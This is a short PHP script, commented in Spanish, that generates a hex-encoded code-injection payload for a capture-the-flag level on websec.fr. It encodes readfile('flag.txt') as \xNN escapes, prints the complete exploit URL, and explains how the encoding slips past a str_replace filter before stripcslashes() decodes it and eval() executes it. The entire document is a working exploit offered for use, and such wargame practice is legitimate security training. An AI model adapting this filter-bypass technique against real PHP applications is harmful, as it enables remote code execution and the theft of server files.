<?php
// Script para generar payloads con hex encoding para bypass de stripcslashes

function str_to_hex_escaped($str) {
    $result = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $result .= '\\x' . str_pad(dechex(ord($str[$i])), 2, '0', STR_PAD_LEFT);
    }
    return $result;
}

// Payload que queremos ejecutar
$payload = "readfile('flag.txt');";

echo "Payload original:\n";
echo "$payload\n\n";

echo "Payload encoded (para el parámetro c):\n";
$encoded = str_to_hex_escaped($payload);
echo "$encoded\n\n";

echo "URL completa:\n";
echo "https://websec.fr/level09/index.php?submit=1&c=" . urlencode($encoded) . "\n\n";

echo "Explicación:\n";
echo "1. Almacenamos el payload encoded\n";
echo "2. El servidor aplica str_replace que elimina caracteres peligrosos\n";
echo "3. El contenido se guarda en /tmp/<hash>\n";
echo "4. Cuando leemos con cache_file, stripcslashes() convierte \\xNN a caracteres\n";
echo "5. eval() ejecuta el código resultante\n";

?>